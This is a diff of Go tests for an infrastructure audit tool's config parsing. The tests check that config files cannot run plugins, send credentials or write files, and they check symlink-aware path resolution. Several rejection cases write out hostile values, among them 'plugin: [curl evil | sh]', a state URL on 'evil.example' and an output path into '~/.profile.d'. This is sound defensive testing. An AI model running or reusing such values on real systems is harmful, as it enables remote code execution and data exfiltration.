@@ -60,24 +60,30 @@ limit: 5
 	// Another file: its relative paths are relative to it.
 	sub := filepath.Join(dir, "audits")
 	os.Mkdir(sub, 0o755)
-	os.WriteFile(filepath.Join(sub, "cf.yaml"), []byte("roots: [../infra]\nstate-roots: [teams, /abs/tree]\nplugin: ./list.sh\nignore: ignore.txt\n"), 0o644)
+	os.WriteFile(filepath.Join(sub, "cf.yaml"), []byte("roots: [../infra]\nstate-roots: [teams, /abs/tree]\nignore: ignore.txt\n"), 0o644)
 	o, err = parseFlags([]string{"-config", "audits/cf.yaml"}, io.Discard)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if !slices.Equal(o.roots, []string{filepath.Join(dir, "infra")}) || !slices.Equal(o.stateRoots, []string{filepath.Join(sub, "teams"), "/abs/tree"}) ||
-		o.ignorePath != filepath.Join(sub, "ignore.txt") || !slices.Equal(o.plugins, []string{"./list.sh"}) {
+	// Joined as written (no cleaning), from the directory the file really
+	// is in.
+	real, _ := filepath.EvalSymlinks(sub)
+	sep := string(filepath.Separator)
+	if !slices.Equal(o.roots, []string{real + sep + "../infra"}) || !slices.Equal(o.stateRoots, []string{real + sep + "teams", "/abs/tree"}) ||
+		o.ignorePath != real+sep+"ignore.txt" {
 		t.Errorf("-config elsewhere: %+v", o)
 	}
 }
 
-// A file read on its own (it may come with a cloned repository) cannot run
-// commands or send credentials; unknown keys and bad values are errors.
+// No config file runs commands, sends credentials or writes files; one
+// read on its own (it may come with a cloned repository) cannot raise trust
+// either; unknown keys and bad values are errors.
 func TestConfigRejected(t *testing.T) {
 	for conf, want := range map[string]string{
-		"plugin: [curl evil | sh]\n":            "only from a file given with -config",
-		"terraform: ./evil\n":                   "only from a file given with -config",
-		"o: ~/.profile.d/x\n":                   "only from a file given with -config",
+		"plugin: [curl evil | sh]\n":            "only on the command line",
+		"terraform: ./evil\n":                   "only on the command line",
+		"o: ~/.profile.d/x\n":                   "only on the command line",
+		"allow-http: true\n":                    "only on the command line",
 		"init: true\n":                          "only from a file given with -config",
 		"state: [https://evil.example/state]\n": "only from a file given with -config",
 		"state: [fake.tfstate]\n":               "only from a file given with -config",
@@ -107,12 +113,19 @@ func TestConfigRejected(t *testing.T) {
 			t.Errorf("%q: %v", conf, err)
 		}
 	}
-	// The same keys are fine in a file the user names.
+	// A file the user names may raise trust, not run commands or send
+	// credentials (o in report mode too: it is no mode-only key to skip).
 	dir := t.TempDir()
 	t.Chdir(dir)
-	os.WriteFile("audit.yaml", []byte("plugin: [./list.sh]\nstate: [https://gitlab.example/state]\ninit: true\n"), 0o644)
-	if o, err := parseFlags([]string{"-config", "audit.yaml"}, io.Discard); err != nil || !o.init || len(o.plugins) != 1 || o.states[0] != "https://gitlab.example/state" {
-		t.Errorf("-config with commands: %+v, %v", o, err)
+	os.WriteFile("audit.yaml", []byte("state: [prod.tfstate]\ninit: true\nproxmox-cluster-states: true\n"), 0o644)
+	if o, err := parseFlags([]string{"-config", "audit.yaml"}, io.Discard); err != nil || !o.init || len(o.states) != 1 {
+		t.Errorf("-config with trust keys: %+v, %v", o, err)
+	}
+	for _, conf := range []string{"plugin: [./list.sh]\n", "state: [https://gitlab.example/state]\n", "terraform: ./tf\n", "o: x.tf\n"} {
+		os.WriteFile("audit.yaml", []byte(conf), 0o644)
+		if _, err := parseFlags([]string{"-config", "audit.yaml"}, io.Discard); err == nil || !strings.Contains(err.Error(), "only on the command line") {
+			t.Errorf("-config %q: %v", conf, err)
+		}
 	}
 }
 
@@ -122,10 +135,8 @@ func TestTerraformPath(t *testing.T) {
 	dir := t.TempDir()
 	t.Chdir(dir)
 	cwd, _ := os.Getwd()
-	os.WriteFile("audit.yaml", []byte("terraform: ./tools/terraform\n"), 0o644)
 	for args, want := range map[string]string{
-		"-config audit.yaml":         filepath.Join(cwd, "tools", "terraform"),
-		"-terraform ./bin/terraform": filepath.Join(cwd, "bin", "terraform"),
+		"-terraform ./bin/terraform": cwd + string(filepath.Separator) + "./bin/terraform",
 		"-terraform tofu":            "tofu",
 	} {
 		o, err := parseFlags(strings.Fields(args), io.Discard)
@@ -173,10 +184,19 @@ func TestConfigInside(t *testing.T) {
 	if o, err := parseFlags(nil, io.Discard); err != nil || !slices.Equal(o.roots, []string{"in"}) || !slices.Equal(o.stateRoots, []string{"in"}) {
 		t.Errorf("inside: %+v, %v", o, err)
 	}
-	// A file given with -config may point anywhere.
+	// A file given with -config may point anywhere, and its paths end
+	// where the system takes them: a link before .. counts.
 	os.Remove(defaultConfigFile)
-	write("audit.yaml", "roots: [jump/../target]\n")
-	if _, err := parseFlags([]string{"-config", "audit.yaml"}, io.Discard); err != nil {
-		t.Errorf("-config: %v", err)
+	os.Mkdir("audits", 0o755)
+	os.Symlink(filepath.Join(outside, "sub"), filepath.Join("audits", "jump"))
+	write(filepath.Join("audits", "audit.yaml"), "roots: [jump/../target]\n")
+	o, err := parseFlags([]string{"-config", "audits/audit.yaml"}, io.Discard)
+	if err != nil || len(o.roots) != 1 {
+		t.Fatalf("-config: %+v, %v", o, err)
+	}
+	got, _ := filepath.EvalSymlinks(o.roots[0])
+	want, _ := filepath.EvalSymlinks(filepath.Join(outside, "target"))
+	if got != want {
+		t.Errorf("-config root %s resolves to %s, want %s", o.roots[0], got, want)
 	}
 }
